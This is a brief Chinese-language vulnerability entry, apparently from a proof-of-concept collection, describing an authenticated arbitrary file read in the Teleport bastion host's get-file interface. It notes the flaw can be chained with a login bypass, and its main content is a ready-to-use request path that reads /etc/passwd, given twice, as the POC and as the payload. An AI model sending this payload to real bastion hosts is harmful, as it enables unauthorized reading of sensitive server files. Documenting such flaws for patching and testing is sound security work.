# Teleport堡垒机 get-file 后台任意文件读取漏洞

## 漏洞描述
Teleport堡垒机 get-file接口存在后台任意文件读取漏洞，攻击者利用任意用户登录漏洞后可以获取后台权限，再进一步利用任意文件读取获取服务器上的敏感文件

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
登录页面

![image-20220824134958109](images/202208241355622.png)

登录后使用POC验证

```
/audit/get-file?f=/etc/passwd&rid=1&type=rdp&act=read&offset=0
```


## Payloads
```
/audit/get-file?f=/etc/passwd&rid=1&type=rdp&act=read&offset=0
```
